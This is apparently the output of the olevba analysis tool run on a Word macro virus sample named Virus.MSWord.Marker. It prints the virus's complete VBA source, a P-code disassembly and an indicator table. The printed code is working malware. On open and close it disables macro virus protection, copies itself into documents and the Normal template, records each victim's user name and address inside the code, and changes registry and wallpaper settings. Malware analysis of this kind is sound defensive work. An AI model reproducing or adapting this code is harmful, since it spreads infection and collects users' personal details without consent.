olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.dm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.dm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Son, Be a Good Boy !
Const Marker = "<- this is a marker! by fs2000"

Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim EmailMe, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Options.VirusProtection = False
Application.UserName = "fs080298"
Application.UserInitials = "FS2000"
Application.UserAddress = "fs080298@hotmail.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub Sisipin
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
GoSub EmailMePlease
GoTo Finish
Sisipin:
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
DI = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   EmailMe = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   EmailMe = EmailMe & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
   nt.CodeModule.AddFromString EmailMe
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    EmailMe = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString EmailMe
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub EmailMePlease
Return
EmailMePlease:
Dim SystemRoot As String
On Error Resume Next
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s1159") = Chr$(60) + Chr$(40) + Chr$(164) + Chr$(191) + Chr$(164) + Chr$(41) + Chr$(62)
 SystemRoot = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open SystemRoot & "\EmailMe.html" For Output As #1
 Print #1, "<html><head><title>Email Me !</title></head><body bgcolor='#000000' link='#FFFF00' vlink='#00FFFF'>"
 Print #1, "<p align='right'><font color='#80FF00' size='3' face='Arial'><marquee scrollamount='3' width='53%'> © Have a Nice Day ! - Don't Forget to Save Your Data...</marquee></font></p>"
 Print #1, "<h6 align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
 Print #1, "<p align='center'><font color='#FF80FF' size='7'><marquee behavior='alternate' width='11%'>ÒÓ</marquee></font>"
 Print #1, "<p align='center'><font color='#FF80FF' size='7'><strong>¯</strong></font></p>"
 Print #1, "<p align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
 Print #1, "<p><br><br><br><br><br></p>"
 Print #1, "<p align='right'><a href='mailto:fs080298@hotmail.com'><font size='2'>Email Me !</font></a></p></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = SystemRoot & "\EmailMe.html"
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s2359") = Chr$(60) + Chr$(40) + Chr$(169) + Chr$(191) + Chr$(169) + Chr$(41) + Chr$(62)
Return
Finish:
End Sub
'Thank for looking my wallpaper
'Logfile -->

' 09:29:389:29:38 AM AM-Monday, 29 Nov 1999
' fs080298
' fs080298@hotmail.com

 


' 06:42:416:42:41 PM PM-Friday, 3 Dec 1999
' fs080298
' fs080298@hotmail.com

 


' 02:44:152:44:15 <(¤¿¤)> <(¤¿¤)>-Tuesday, 7 Dec 1999
' fs080298
' fs080298@hotmail.com

 


' 09:13:199:13:19 AM AM-Friday, 24 Dec 1999
' fs080298
' fs080298@hotmail.com

 


' 02:28:372:28:37 <(©¿©)> <(©¿©)>-Saturday, 22 Jan 2000
' fs080298
' fs080298@hotmail.com

 


' 12:01:5812:01:58 AM AM-Saturday, 12 Feb 2000
' fs080298
' fs080298@hotmail.com

 


' 10:36:910:36:09 AM AM-Thursday, 17 Feb 2000
' fs080298
' fs080298@hotmail.com

 


' 11:31:4411:31:44 -Segunda-feira, 21 Fev 2000
' fs080298
' fs080298@hotmail.com

 


' 07:55:1719:55:17 -Segunda-feira, 21 Fev 2000
' fs080298
' fs080298@hotmail.com

 


' 12:10:1512:10:15 -terça-feira, 22 fev 2000
' fs080298
' fs080298@hotmail.com

 


' 03:26:4215:26:42 -Sexta-feira, 25 Fev 2000
' fs080298
' fs080298@hotmail.com

 


' 04:51:2716:51:27 -Sexta-feira, 10 Mar 2000
' fs080298
' fs080298@hotmail.com

 


' 06:26:36:26:03 AM AM-Wednesday, 29 Mar 2000
' fs080298
' fs080298@hotmail.com

 


' 11:36:5111:36:51  dop.-støeda, 3 V 2000
' fs080298
' fs080298@hotmail.com

 

' 11:45:2311:45:23 AM AM-Monday, 11 Sep 2000
' fs080298
' fs080298@hotmail.com

 


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.dm
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11187 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Son, Be a Good Boy !"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x001E "<- this is a marker! by fs2000"
' 	VarDefn Marker
' Line #2:
' Line #3:
' 	FuncDefn (Private Sub Document_Open())
' Line #4:
' 	ArgsCall Document_Close 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Private Sub Document_Close())
' Line #7:
' 	Dim 
' 	VarDefn nmod (As Object)
' Line #8:
' 	Dim 
' 	VarDefn isd (As String)
' Line #9:
' 	Dim 
' 	VarDefn DS
' 	VarDefn NTS
' 	VarDefn DI
' 	VarDefn NTI (As Boolean)
' Line #10:
' 	Dim 
' 	VarDefn EmailMe
' 	VarDefn Users
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	LitVarSpecial (True)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #14:
' 	LitStr 0x0008 "fs080298"
' 	Ld Application 
' 	MemSt UserName 
' Line #15:
' 	LitStr 0x0006 "FS2000"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #16:
' 	LitStr 0x0014 "fs080298@hotmail.com"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #17:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #18:
' 	GoSub Sisipin 
' Line #19:
' 	LineCont 0x0004 0A 00 03 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoSub LoggingIn 
' 	EndIf 
' Line #20:
' 	GoSub EmailMePlease 
' Line #21:
' 	GoTo Finish 
' Line #22:
' 	Label Sisipin 
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #25:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DI 
' Line #26:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NTI 
' Line #27:
' 	Ld DI 
' 	Ld NTI 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #28:
' 	Ld DI 
' 	IfBlock 
' Line #29:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St NTS 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St EmailMe 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #32:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #33:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #34:
' 	Ld Users 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Users 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	ElseBlock 
' Line #37:
' 	Ld Users 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 " '"
' 	Concat 
' 	St Users 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	StartForVariable 
' 	Next 
' Line #40:
' 	LineCont 0x0010 09 00 09 00 12 00 10 00 1E 00 09 00 29 00 09 00
' 	Ld EmailMe 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000E "hh:mm:sc AMPM-"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Users 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	St EmailMe 
' Line #41:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #42:
' 	Ld EmailMe 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #43:
' 	Ld NTS 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld NTI 
' 	IfBlock 
' Line #46:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St DS 
' Line #47:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St EmailMe 
' Line #48:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #49:
' 	Ld EmailMe 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #50:
' 	Ld DS 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Return 
' Line #54:
' 	Label LoggingIn 
' Line #55:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #56:
' 	GoSub EmailMePlease 
' Line #57:
' 	Return 
' Line #58:
' 	Label EmailMePlease 
' Line #59:
' 	Dim 
' 	VarDefn SystemRoot (As String)
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	LitDI2 0x003C 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0028 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_CURRENT_USER\Control Panel\International"
' 	LitStr 0x0005 "s1159"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #62:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St SystemRoot 
' Line #63:
' 	Ld SystemRoot 
' 	LitStr 0x000D "\EmailMe.html"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0063 "<html><head><title>Email Me !</title></head><body bgcolor='#000000' link='#FFFF00' vlink='#00FFFF'>"
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00B0 "<p align='right'><font color='#80FF00' size='3' face='Arial'><marquee scrollamount='3' width='53%'> © Have a Nice Day ! - Don't Forget to Save Your Data...</marquee></font></p>"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00C6 "<h6 align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006E "<p align='center'><font color='#FF80FF' size='7'><marquee behavior='alternate' width='11%'>ÒÓ</marquee></font>"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004E "<p align='center'><font color='#FF80FF' size='7'><strong>¯</strong></font></p>"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0097 "<p align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "<p><br><br><br><br><br></p>"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006D "<p align='right'><a href='mailto:fs080298@hotmail.com'><font size='2'>Email Me !</font></a></p></Body></html>"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #73:
' 	Ld SystemRoot 
' 	LitStr 0x000D "\EmailMe.html"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #74:
' 	LitDI2 0x003C 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0028 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_CURRENT_USER\Control Panel\International"
' 	LitStr 0x0005 "s2359"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #75:
' 	Return 
' Line #76:
' 	Label Finish 
' Line #77:
' 	EndSub 
' Line #78:
' 	QuoteRem 0x0000 0x001E "Thank for looking my wallpaper"
' Line #79:
' 	QuoteRem 0x0000 0x000B "Logfile -->"
' Line #80:
' Line #81:
' 	QuoteRem 0x0000 0x002A " 09:29:389:29:38 AM AM-Monday, 29 Nov 1999"
' Line #82:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #83:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' 	QuoteRem 0x0000 0x0029 " 06:42:416:42:41 PM PM-Friday, 3 Dec 1999"
' Line #89:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #90:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' 	QuoteRem 0x0000 0x0034 " 02:44:152:44:15 <(¤¿¤)> <(¤¿¤)>-Tuesday, 7 Dec 1999"
' Line #96:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #97:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' 	QuoteRem 0x0000 0x002A " 09:13:199:13:19 AM AM-Friday, 24 Dec 1999"
' Line #103:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #104:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' 	QuoteRem 0x0000 0x0036 " 02:28:372:28:37 <(©¿©)> <(©¿©)>-Saturday, 22 Jan 2000"
' Line #110:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #111:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' 	QuoteRem 0x0000 0x002D " 12:01:5812:01:58 AM AM-Saturday, 12 Feb 2000"
' Line #117:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #118:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' 	QuoteRem 0x0000 0x002C " 10:36:910:36:09 AM AM-Thursday, 17 Feb 2000"
' Line #124:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #125:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' 	QuoteRem 0x0000 0x002D " 11:31:4411:31:44 -Segunda-feira, 21 Fev 2000"
' Line #131:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #132:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' 	QuoteRem 0x0000 0x002D " 07:55:1719:55:17 -Segunda-feira, 21 Fev 2000"
' Line #138:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #139:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' 	QuoteRem 0x0000 0x002B " 12:10:1512:10:15 -terça-feira, 22 fev 2000"
' Line #145:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #146:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' 	QuoteRem 0x0000 0x002B " 03:26:4215:26:42 -Sexta-feira, 25 Fev 2000"
' Line #152:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #153:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' 	QuoteRem 0x0000 0x002B " 04:51:2716:51:27 -Sexta-feira, 10 Mar 2000"
' Line #159:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #160:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' 	QuoteRem 0x0000 0x002C " 06:26:36:26:03 AM AM-Wednesday, 29 Mar 2000"
' Line #166:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #167:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' 	QuoteRem 0x0000 0x0028 " 11:36:5111:36:51  dop.-støeda, 3 V 2000"
' Line #173:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #174:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' 	QuoteRem 0x0000 0x002B " 11:45:2311:45:23 AM AM-Monday, 11 Sep 2000"
' Line #179:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #180:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #181:
' Line #182:
' Line #183:
' Line #184:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

